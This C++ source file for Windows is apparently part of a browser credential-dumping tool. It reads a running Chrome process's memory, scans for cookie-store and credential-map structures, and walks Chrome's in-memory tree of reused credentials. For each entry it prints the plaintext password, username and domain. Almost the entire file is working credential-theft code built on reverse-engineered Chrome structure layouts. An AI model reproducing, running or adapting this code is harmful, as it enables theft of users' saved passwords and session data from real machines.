#include <Windows.h>
#include <stdio.h>

#include "Helper.h"
#include <string>
#include <map>
#include <memory>
#include <vector>

struct WideOptimizedString {
    wchar_t buf[11];
    char unk[1];
    UCHAR len;
};

struct OptimizedString {
    char buf[23];
    UCHAR len;
};

struct RemoteString {
    uintptr_t dataAddress;
    size_t strLen; //This won't include the null terminator
    int strMax; //Maximum string length
    char unk[3]; //I just couldn't figure out the last data type :(
    UCHAR strAlloc; //Seems to always be 0x80, honestly no idea what it should mean
};

enum class Store {
    // Default value.
    kNotSet = 0,
    // Credential came from the profile (i.e. local) storage.
    kProfileStore = 1 << 0,
    // Credential came from the Gaia-account-scoped storage.
    kAccountStore = 1 << 1,
    kMaxValue = kAccountStore
};

struct MatchingReusedCredential {
    uintptr_t left;
    uintptr_t right;
    uintptr_t parent;
    bool is_black; //My guess is that data is stored in red-black tree
    char padding[7];

    OptimizedString domain;
    WideOptimizedString username;
    Store credentialStore;
};

struct Node {
    uintptr_t left;
    uintptr_t right;
    uintptr_t parent;
    bool is_black; //My guess is that data is stored in red-black tree
    char padding[7];
    WideOptimizedString key;
    uintptr_t valueAddress;
};

struct RootNode {
    uintptr_t beginNode;
    uintptr_t firstNode;
    size_t size;
};

//Since Chrome uses std::string type a lot, we need to take into account if the string has been optimized to use Small String Optimization
//Or if it is stored in another address
void ReadWideString(HANDLE hProcess, WideOptimizedString string) {

    if (string.len > 11)
    {
        RemoteString longString = { 0 };
        std::memcpy(&longString, &string.buf, sizeof(RemoteString));

        if (longString.dataAddress != 0) {
#ifdef _DEBUG
            printf("Attempting to read the credential value from address: 0x%p\n", (void*)longString.dataAddress);
#endif
            wchar_t* buf = (wchar_t*)malloc((longString.strMax + 1) * 2);
            if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(longString.dataAddress), buf, (longString.strLen + 1)*2, nullptr)) {
                DebugPrintErrorWithMessage(TEXT("Failed to read credential value"));
                free(buf);
                return;
            }
            printf("%ls\n", buf);
            free(buf);
        }
    }
    else
        printf("%ls\n", string.buf);

}

void ReadString(HANDLE hProcess, OptimizedString string) {

    if (string.len > 23)
    {
        RemoteString longString = { 0 };
        std::memcpy(&longString, &string.buf, sizeof(RemoteString));

        if (longString.dataAddress != 0) {
#ifdef _DEBUG
            printf("Attempting to read the credential value from address: 0x%p\n", (void*)longString.dataAddress);
#endif
            unsigned char* buf = (unsigned char*)malloc(longString.strMax);
            if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(longString.dataAddress), buf, longString.strLen + 1, nullptr)) {
                DebugPrintErrorWithMessage(TEXT("Failed to read credential value"));
                free(buf);
                return;
            }
            printf("%s\n", buf);
            free(buf);
        }
    }
    else
        printf("%s\n", string.buf);

}

void PrintValues(MatchingReusedCredential creds, HANDLE hProcess) {
    printf("    Name: ");
    ReadWideString(hProcess, creds.username);
    printf("    Domain: ");
    ReadString(hProcess, creds.domain);
    if (creds.credentialStore == Store::kNotSet)
        printf("    CredentialStore: NotSet");
    else if (creds.credentialStore == Store::kAccountStore)
        printf("    CredentialStore: AccountStore");
    else if (creds.credentialStore == Store::kProfileStore)
        printf("    CredentialStore: ProfileStore");
    else if (creds.credentialStore == Store::kMaxValue)
        printf("    CredentialStore: MaxValue");
    else 
        printf("    CredentialStore: Error!");

    printf("\n\n");
}

void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr) {

    MatchingReusedCredential creds = { 0 };
    if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &creds, sizeof(MatchingReusedCredential), nullptr)) {
        PrintErrorWithMessage(TEXT("Failed to read credential struct"));
        return;
    }
    PrintValues(creds, hProcess);
}

void ProcessNode(HANDLE hProcess, const Node& node) {
    // Process the current node
    printf("Credential entry:\n");
    printf("    Password: ");
    ReadWideString(hProcess, node.key);

#ifdef _DEBUG
    printf("Attempting to read credential values from address:  0x%p\n", (void*)node.valueAddress);
#endif
    ProcessNodeValue(hProcess, node.valueAddress);

    // Process the left child if it exists
    if (node.left != 0) {
        Node leftNode;
        if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.left), &leftNode, sizeof(Node), nullptr))
            ProcessNode(hProcess, leftNode);
        else
            PrintErrorWithMessage(TEXT("Error reading left node"));
    }

    // Process the right child if it exists
    if (node.right != 0) {
        Node rightNode;
        if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.right), &rightNode, sizeof(Node), nullptr))
            ProcessNode(hProcess, rightNode);
        else
            PrintErrorWithMessage(TEXT("Error reading right node"));
    }
}

void WalkCredentialMap(HANDLE hProcess, uintptr_t credentialMapAddress) {

    RootNode credentialMap;
    if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(credentialMapAddress), &credentialMap, sizeof(RootNode), nullptr)) {
        PrintErrorWithMessage(TEXT("Failed to read the root node from given address\n"));
        return;
    }

    // Process the root node
#ifdef _DEBUG
    printf("Address of beginNode: 0x%p\n", (void*)credentialMap.beginNode);
    printf("Address of firstNode: 0x%p\n", (void*)credentialMap.firstNode);
    printf("Size of the credential map: %zu\n", credentialMap.size);
#endif // _DEBUG

    printf("[*] Number of available credentials: %zu\n\n", credentialMap.size);

    if (credentialMap.firstNode == 0) //CookieMap was empty
    {
        printf("[*] This credential map was empty\n");
        return;
    }

    // Process the first node in the binary search tree
    Node firstNode;
    if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(credentialMap.firstNode), &firstNode, sizeof(Node), nullptr) && &firstNode != nullptr)
        ProcessNode(hProcess, firstNode);
    else
        PrintErrorWithMessage(TEXT("Error reading first node\n"));
}

BOOL MyMemCmp(BYTE* source, const BYTE* searchPattern, size_t num) {

    for (size_t i = 0; i < num; ++i) {
        if (searchPattern[i] == 0xAA)
            continue;
        if (source[i] != searchPattern[i]) {
            return FALSE;
        }
    }

    return TRUE;
}

BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintptr_t* cookieMonsterInstances, size_t& szCookieMonster) {

    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);

    uintptr_t startAddress = reinterpret_cast<uintptr_t>(systemInfo.lpMinimumApplicationAddress);
    uintptr_t endAddress = reinterpret_cast<uintptr_t>(systemInfo.lpMaximumApplicationAddress);

    MEMORY_BASIC_INFORMATION memoryInfo;

    while (startAddress < endAddress) {
        if (VirtualQueryEx(hProcess, reinterpret_cast<LPCVOID>(startAddress), &memoryInfo, sizeof(memoryInfo)) == sizeof(memoryInfo)) {
            if (memoryInfo.State == MEM_COMMIT && (memoryInfo.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE)) != 0) {
                BYTE* buffer = new BYTE[memoryInfo.RegionSize];
                SIZE_T bytesRead;

                //Error code 299
                //Only part of a ReadProcessMemory or WriteProcessMemory request was completed. 
                //We are fine with that -- We were not fine with that
                //if (ReadProcessMemory(hProcess, memoryInfo.BaseAddress, buffer, memoryInfo.RegionSize, &bytesRead) || GetLastError() == 299) {
                if (ReadProcessMemory(hProcess, memoryInfo.BaseAddress, buffer, memoryInfo.RegionSize, &bytesRead)) {
                    for (size_t i = 0; i <= bytesRead - patternSize; ++i) {
                        if (memcmp(buffer + i, pattern, patternSize) == 0) {
                            uintptr_t resultAddress = reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress) + i;
                            uintptr_t offset = resultAddress - reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress);
#ifdef _DEBUG
                            printf("Found pattern on AllocationBase: 0x%p, BaseAddress: 0x%p, Offset: 0x%Ix\n",
                                memoryInfo.AllocationBase,
                                memoryInfo.BaseAddress,
                                offset);
#endif
                            cookieMonsterInstances[szCookieMonster] = resultAddress;
                            szCookieMonster++;
                        }
                    }
                }
                else {
                    //This happens quite a lot, will not print these errors on release build
                    DEBUG_PRINT_ERROR_MESSAGE(TEXT("ReadProcessMemory failed\n"));
                }

                delete[] buffer;
            }

            startAddress += memoryInfo.RegionSize;
        }
        else {
            DebugPrintErrorWithMessage(TEXT("VirtualQueryEx failed\n"));
            break;  // VirtualQueryEx failed
        }
    }
    if (szCookieMonster > 0)
        return TRUE;
    return FALSE;
}

BOOL FindDllPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintptr_t moduleAddr, DWORD moduleSize, uintptr_t& resultAddress)
{
    BYTE* buffer = new BYTE[moduleSize];
    SIZE_T bytesRead;

    BOOL result = ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(moduleAddr), buffer, moduleSize, &bytesRead);
    DWORD error = GetLastError();

    if (result || error == 299) { //It is fine if not all was read
        for (size_t i = 0; i <= bytesRead - patternSize; ++i) {
            if (MyMemCmp(buffer + i, pattern, patternSize)) {
                resultAddress = moduleAddr + i;
                delete[] buffer;
                return TRUE;
            }
        }
    }
    else {
        //This happens quite a lot, will not print these errors on release build
        DEBUG_PRINT_ERROR_MESSAGE(TEXT("ReadProcessMemory failed\n"));
    }
    return FALSE;
}